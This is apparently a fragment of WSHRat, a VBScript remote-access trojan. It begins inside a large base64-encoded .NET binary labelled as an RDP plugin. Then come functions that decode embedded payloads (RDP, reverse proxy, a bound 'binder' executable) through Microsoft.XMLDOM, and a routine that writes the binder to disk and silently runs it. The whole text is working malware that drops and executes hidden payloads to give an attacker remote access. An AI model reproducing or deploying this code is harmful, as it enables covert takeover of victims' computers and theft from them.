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BlAHIAcwBpAG8AbgAAAAAAMQAuADEALgAwAC4AMAAAADAACAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAUgBEAFAALgBlAHgAZQAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADEAOQAAADgACAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABSAEQAUAAuAGUAeABlAAAALAAGAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAAByAGQAcABsAHUAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMQAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAxAC4AMAAuADAAAAAAAAAAKAAAACAAAABAAAAAAQAEAAAAAACAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHd3d3d3d3d3d3d3d3d3cARERERERERERERERERERHAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAEiIiIiIiIiIiIiIiIiIRwBEREREREREREREREREREcARMTExMTExMTExOzs5JdHAEzMzMzMzMzMzMzMzMzMQAAERERERERERERERERERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/////////////////////AAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAPAAAAH////////////////KAAAABAAAAAgAAAAAQAEAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAd3d3d3d3d3REREREREREdP///////4R0////////hHT///////+EdP///////4R0////////hHT///////+EdP///////4R0////////hHSIiIiIiIiEdMzMzMzMzMR8RERERERETAAAAAAAAAAAAAAAAAAAAAAP//AACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA//8AAP//AAAAAAEAAgAgIBAAAQAEAOgCAAACABAQEAABAAQAKAEAAAMAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxhc212MTphc3NlbWJseSBtYW5pZmVzdFZlcnNpb249IjEuMCIgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiB4bWxuczphc212MT0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIHhtbG5zOmFzbXYyPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBwbGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8IS0tIFVBQyBNYW5pZmVzdCBPcHRpb25zDQogICAgICAgICAgICBJZiB5b3Ugd2FudCB0byBjaGFuZ2UgdGhlIFdpbmRvd3MgVXNlciBBY2NvdW50IENvbnRyb2wgbGV2ZWwgcmVwbGFjZSB0aGUgDQogICAgICAgICAgICByZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBub2RlIHdpdGggb25lIG9mIHRoZSBmb2xsb3dpbmcuDQoNCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsICBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiIC8+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCAgbGV2ZWw9InJlcXVpcmVBZG1pbmlzdHJhdG9yIiB1aUFjY2Vzcz0iZmFsc2UiIC8+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCAgbGV2ZWw9ImhpZ2hlc3RBdmFpbGFibGUiIHVpQWNjZXNzPSJmYWxzZSIgLz4NCg0KICAgICAgICAgICAgU3BlY2lmeWluZyByZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBub2RlIHdpbGwgZGlzYWJsZSBmaWxlIGFuZCByZWdpc3RyeSB2aXJ0dWFsaXphdGlvbi4NCiAgICAgICAgICAgIElmIHlvdSB3YW50IHRvIHV0aWxpemUgRmlsZSBhbmQgUmVnaXN0cnkgVmlydHVhbGl6YXRpb24gZm9yIGJhY2t3YXJkIA0KICAgICAgICAgICAgY29tcGF0aWJpbGl0eSB0aGVuIGRlbGV0ZSB0aGUgcmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbm9kZS4NCiAgICAgICAgLS0+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQogIA0KICA8Y29tcGF0aWJpbGl0eSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpjb21wYXRpYmlsaXR5LnYxIj4NCiAgICA8YXBwbGljYXRpb24+DQogICAgICA8IS0tIEEgbGlzdCBvZiBhbGwgV2luZG93cyB2ZXJzaW9ucyB0aGF0IHRoaXMgYXBwbGljYXRpb24gaXMgZGVzaWduZWQgdG8gd29yayB3aXRoLiBXaW5kb3dzIHdpbGwgYXV0b21hdGljYWxseSBzZWxlY3QgdGhlIG1vc3QgY29tcGF0aWJsZSBlbnZpcm9ubWVudC4tLT4NCg0KICAgICAgPCEtLSBJZiB5b3VyIGFwcGxpY2F0aW9uIGlzIGRlc2lnbmVkIHRvIHdvcmsgd2l0aCBXaW5kb3dzIDcsIHVuY29tbWVudCB0aGUgZm9sbG93aW5nIHN1cHBvcnRlZE9TIG5vZGUtLT4NCiAgICAgIDwhLS08c3VwcG9ydGVkT1MgSWQ9InszNTEzOGI5YS01ZDk2LTRmYmQtOGUyZC1hMjQ0MDIyNWY5M2F9Ii8+LS0+DQogICAgICANCiAgICA8L2FwcGxpY2F0aW9uPg0KICA8L2NvbXBhdGliaWxpdHk+DQogIA0KICA8IS0tIEVuYWJsZSB0aGVtZXMgZm9yIFdpbmRvd3MgY29tbW9uIGNvbnRyb2xzIGFuZCBkaWFsb2dzIChXaW5kb3dzIFhQIGFuZCBsYXRlcikgLS0+DQogIDwhLS0gPGRlcGVuZGVuY3k+DQogICAgPGRlcGVuZGVudEFzc2VtYmx5Pg0KICAgICAgPGFzc2VtYmx5SWRlbnRpdHkNCiAgICAgICAgICB0eXBlPSJ3aW4zMiINCiAgICAgICAgICBuYW1lPSJNaWNyb3NvZnQuV2luZG93cy5Db21tb24tQ29udHJvbHMiDQogICAgICAgICAgdmVyc2lvbj0iNi4wLjAuMCINCiAgICAgICAgICBwcm9jZXNzb3JBcmNoaXRlY3R1cmU9IioiDQogICAgICAgICAgcHVibGljS2V5VG9rZW49IjY1OTViNjQxNDRjY2YxZGYiDQogICAgICAgICAgbGFuZ3VhZ2U9IioiDQogICAgICAgIC8+DQogICAgPC9kZXBlbmRlbnRBc3NlbWJseT4NCiAgPC9kZXBlbmRlbmN5Pi0tPg0KDQo8L2FzbXYxOmFzc2VtYmx5Pg0KDQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAMAAAA4DIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	set spike = (CreateObject("Microsoft.XMLDOM")).createElement("tmp")
	spike.dataType = "bin.base64"
	spike.text = encoded
	getRDP = spike.NodeTypedValue
end function

function getReverseProxy()
	encoded = "
	set spike = (CreateObject("Microsoft.XMLDOM")).createElement("tmp")
	spike.dataType = "bin.base64"
	spike.text = encoded
	getReverseProxy = spike.NodeTypedValue
end function

function getBinder()
	encoded = "[binder]"
	if encoded <> "[binder]" then
		set spike = (CreateObject("Microsoft.XMLDOM")).createElement("tmp")
		spike.dataType = "bin.base64"
		spike.text = encoded
		getBinder = spike.NodeTypedValue
	else
		getBinder = false
	end if
end function

sub runBinder()
strsaveto = installdir & "ibnder.exe"

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if

dim  objstreamdownload
set  objstreamdownload = createobject("adodb.stream")
with objstreamdownload
	.type = 1 
	.open
	.write getBinder()
	.savetofile strsaveto
	.close
end with
set objstreamdownload = nothing

if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34)
end if 
end sub